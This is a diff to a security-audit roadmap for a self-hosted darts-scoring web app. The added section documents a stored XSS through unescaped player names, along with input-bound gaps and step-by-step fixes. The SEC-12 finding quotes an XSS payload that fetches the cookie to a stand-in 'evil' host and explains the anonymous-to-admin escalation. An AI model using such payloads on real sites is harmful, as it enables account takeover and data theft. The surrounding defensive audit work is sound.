@@ -1,6 +1,11 @@
 # Security Audit Roadmap (adversarial whole-codebase review)
 
-> **Status: ✅ All findings fixed (SEC-1 through SEC-11).** See the "Status" line
+> **Status: SEC-1 through SEC-11 fixed. A second-pass audit (2026-07, after the
+> Cricket / Doubles Practice / Just Chuckin' It / Ghost-mode expansion) opened
+> three NEW findings — SEC-12 (stored XSS), SEC-13, SEC-14 — see "Part 4" below.
+> SEC-12 is OPEN and should be fixed first.** The original eleven are unchanged.
+>
+> See the "Status" line
 > under each finding below for what actually shipped, which in a couple of places is
 > a more robust implementation than the original suggested fix — e.g. SEC-5 uses a
 > root-briefly/chown/drop-to-non-root entrypoint rather than a bare `USER node`, so
@@ -486,7 +491,8 @@ already there). Continue returning specific messages for 4xx.
 7. ~~**SEC-9, SEC-10, SEC-11** (bounded settings, headers, generic 5xx) — quick hardening.~~ ✅
 8. ~~**SEC-8** (revisit lockout vs. IP throttling once SEC-3 lands).~~ ✅ (documented)
 
-**Every finding in this audit is now closed.**
+**Every finding in the ORIGINAL audit (SEC-1..SEC-11) is closed.** Part 4 below
+tracks a later second pass.
 
 ## Standing practice
 
@@ -495,3 +501,161 @@ accepted input, and rate-limit anything that does expensive work (crypto, outbou
 requests, or DB writes) before that work runs. Every new outbound request: run it
 through the SEC-4 egress guard. Every new credential/secret: write-only handling +
 brute-force protection (see `docs/security-hardening-roadmap.md`).
+
+---
+
+## Part 4 — Second-pass audit (2026-07, after the game-modes expansion)
+
+A fresh adversarial read of the whole codebase after Cricket, Doubles Practice, Just
+Chuckin' It, Ghost mode, the expanded Daily Challenge, and the many new stat/leaderboard
+endpoints were added. Same threat model and severity legend as the top of this doc. The
+SQLi/auth-primitive/path-traversal/CSRF surfaces were re-checked and remain safe (see
+Part 3). Three new findings:
+
+### SEC-12 — Stored XSS via a player name in Settings → PIN management  **(MED, unauthenticated in the default config)**
+
+**Status: 🔴 OPEN.** Fix first.
+
+**Where:** `frontend/index.html` `renderPinPlayersList()` (the two `onclick` handlers
+that call `askSetPlayerPin(...)` / `askRemovePlayerPin(...)`). They interpolate a player
+name into a **double-quoted** `onclick="..."` attribute using **`escapeJs(n)` only**:
+
+```js
+onclick="askSetPlayerPin('${escapeJs(n)}')"
+```
+
+`escapeJs()` escapes `\` and `'` but **not** `"`, `<`, or `>`. Every *other* `onclick`
+site in the same file wraps the value as `escapeHtml(escapeJs(name))` (e.g. the
+player-list/profile handlers at lines ~3014, ~3118, ~6176) — this one site is missing the
+outer `escapeHtml`, so it's inconsistent with the file's own established safe pattern.
+
+**Attack:** player names have **no charset restriction** server-side (`addPlayer()` in
+`db.js` only does `String(name).trim()` + non-empty). In the default `OCHE_REQUIRE_AUTH`
+-off config, **anyone** can `POST /api/players` with a name like:
+
+```
+x"><img src=x onerror=fetch('//evil/'+document.cookie)>
+```
+
+`roster` on every client is populated from `GET /api/players` (`index.html` ~line 1247),
+so the poisoned name reaches every admin. When an admin opens **Settings → PIN
+management**, the un-escaped `"` closes the `onclick` attribute, `>` closes the `<button>`,
+and the injected `<img onerror>` executes **in the admin's authenticated session** — no
+click required. The session cookie is `HttpOnly` (so it can't be read by `document.cookie`),
+but the injected script can still call any admin API directly (create a new admin, change
+a password, wipe data) using the admin's ambient session. This is an anonymous → admin
+privilege escalation. (Verified by reproducing the exact rendered string: the current
+helper emits a live `<img onerror>`; `escapeHtml(escapeJs(n))` renders it inert as
+`&quot;&gt;&lt;img...&gt;`.)
+
+Note: with `OCHE_REQUIRE_AUTH=true`, only admins can create players, so the cross-privilege
+angle narrows — but the fix is trivial and defense-in-depth says escape regardless (a name
+could have been planted before auth was enabled).
+
+**Fix (step by step):**
+1. In `renderPinPlayersList()`, change both handlers to the same pattern the rest of the
+   file already uses: `onclick="askSetPlayerPin('${escapeHtml(escapeJs(n))}')"` (and the
+   Remove-PIN one). Nothing else changes — the display `<span>` already uses
+   `escapeHtml(n)` correctly.
+2. Harden the two admin-username handlers (`askChangeAdminPassword` / `askDeleteAdmin`,
+   lines ~2289-2290) the same way. They're **not** exploitable today (usernames are
+   restricted to `^[A-Za-z0-9_.-]{3,32}$`, so no `"`), but wrapping them in `escapeHtml`
+   removes the "safe only because of a validator elsewhere" coupling.
+3. Consider a lint/grep guard: any `escapeJs(` that isn't inside `escapeHtml(escapeJs(`
+   is a smell. There should be zero.
+
+**Verify:** create a player named `x"><img src=x onerror=alert(1)>`, open Settings → PIN
+management, confirm no alert fires and the name renders literally.
+
+---
+
+### SEC-13 — Player names have no server-side length or shape bound  **(LOW)**
+
+**Status: 🔴 OPEN.**
+
+**Where:** `db.js` `addPlayer()` / `renamePlayer()` / `ensurePlayer()` — a name is only
+`String(name).trim()` + non-empty. No max length, no charset policy.
+
+**Attack:** (a) this is the raw material for SEC-12 — any character reaches the client.
+(b) A name can be up to ~1MB (bounded only by `readJson`'s body cap), and names are stored
+and echoed into many views, canvases, and the live payload — a handful of giant names
+bloats storage and every render. Low impact on a single-household box, but unbounded
+free-text from an unauthenticated caller is exactly what the threat model wants bounded.
+
+**Fix (step by step):**
+1. In `addPlayer()` and `renamePlayer()`, after `trim()`, reject names longer than a sane
+   cap (e.g. 64 chars) with a 400. Optionally normalize/collapse whitespace.
+2. Keep the charset permissive (people want emoji/apostrophes in names) — the real defense
+   against injection is consistent output escaping (SEC-12), not an input charset filter.
+   But do reject control characters (`\x00-\x1f`) which have no legitimate use in a name.
+3. Mirror the same cap in the frontend `maxlength` for a nicer UX (belt and braces).
+
+**Verify:** a 5000-char name and a name with a raw newline are both rejected with 400.
+
+---
+
+### SEC-14 — Several write endpoints accept unbounded / unvalidated free-form fields  **(LOW, data-integrity + minor storage-DoS when auth is off)**
+
+**Status: 🔴 OPEN.**
+
+**Where / what:** all of these are parameterized (so **not** SQL injection) but accept
+values with no whitelist or bound, so in the default auth-off config an unauthenticated
+client can write junk that pollutes stats/leaderboards or grows the DB:
+
+- `awardBadge()` / `revokeBadge()` (`db.js`) — `badgeId` is any string. Anyone can award
+  an arbitrary or real badge to any player, or inflate a real badge's `count` without
+  limit. Leaderboard/badge-case pollution.
+- `createGame()` (`db.js`) — `gameType` is `gameType || 'x01'` with **no whitelist** (a
+  bogus type is stored; it then silently escapes every typed stat query — see BUG-2 in the
+  bug roadmap), `category` is an unbounded string, and `config` is an arbitrary object
+  `JSON.stringify`'d into the row (no size cap).
+- `startChallengeAttempt()` (`db.js`) — `challengeDate` and `format` are stored via bare
+  `String(...)` with no `^\d{4}-\d{2}-\d{2}$` / known-format check (the *read* side —
+  `getChallengeStatus`/`resetChallengeAttempt` — DOES validate the date, so a bad-date row
+  is written but then unreachable; see BUG-1 in the bug roadmap).
+- `recordEvent()` (`db.js`) — `eventType` is any string.
+
+**Attack:** none of these is a takeover or injection path; the impact is (a) corrupted /
+spammable stats and badges, and (b) unbounded table growth from an unauthenticated source
+when `OCHE_REQUIRE_AUTH` is off. The global 300-req/60s/IP limiter (SEC-3) bounds the *rate*
+but not the *total*, and multiple IPs bypass the per-IP cap.
+
+**Fix (step by step):**
+1. `awardBadge`/`revokeBadge`: validate `badgeId` against the known badge-id set (the same
+   list the Badge Case already knows) and reject unknown ids with 400. Optionally cap
+   `count` at a sane ceiling.
+2. `createGame`: whitelist `gameType` against `KNOWN_GAME_TYPES` (already defined in
+   `db.js`) and reject unknown; bound `category` length (e.g. ≤64) and the serialized
+   `config` size (e.g. ≤4KB).
+3. `startChallengeAttempt`/`completeChallengeAttempt`: validate `challengeDate` with the
+   same `^\d{4}-\d{2}-\d{2}$` regex used on the read side, and `format` against the six
+   known formats; reject otherwise with 400.
+4. `recordEvent`: whitelist `eventType` against the known event types.
+5. Broadly: the single biggest lever for an internet-exposed box is
+   `OCHE_REQUIRE_AUTH=true` (already the SEC-6 checklist recommendation) — with it on,
+   every write above requires an admin session, which removes the anonymous-pollution
+   angle entirely. These per-field validations are defense-in-depth on top of that.
+
+**Verify:** an award with a made-up `badgeId`, a `createGame` with `gameType:'evil'`, and a
+`startChallengeAttempt` with `challengeDate:'not-a-date'` each return 400.
+
+---
+
+### Residual risk reaffirmed (not a new finding)
+
+In the **default** `OCHE_REQUIRE_AUTH`-off configuration, every write endpoint (including
+`POST /api/live`, which re-broadcasts to all `/display` screens) is unauthenticated — an
+attacker on the network can inject fake games, spam stats, or hijack the scoreboard
+"billboard" (the payload is key-whitelisted and size-capped by `sanitizeLiveState`, and
+`display.html` escapes every field, so this is annoyance, not XSS). This is the documented
+open-LAN trade-off (see the threat model at the top). For any internet-exposed deployment
+the mitigation is the SEC-6 checklist — chiefly `OCHE_REQUIRE_AUTH=true` behind a
+TLS-terminating reverse proxy. Reaffirming it here so a future reader doesn't mistake the
+auth-off default for an oversight.
+
+## Suggested order for Part 4
+
+1. **SEC-12** (XSS) — real, cheap, do it first.
+2. **SEC-13** (name bounds) — cheap, and it shrinks SEC-12's raw material.
+3. **SEC-14** (validate write inputs) — mostly data-integrity; pairs with the bug-roadmap
+   items BUG-1/BUG-2 that share the same missing-validation root cause.
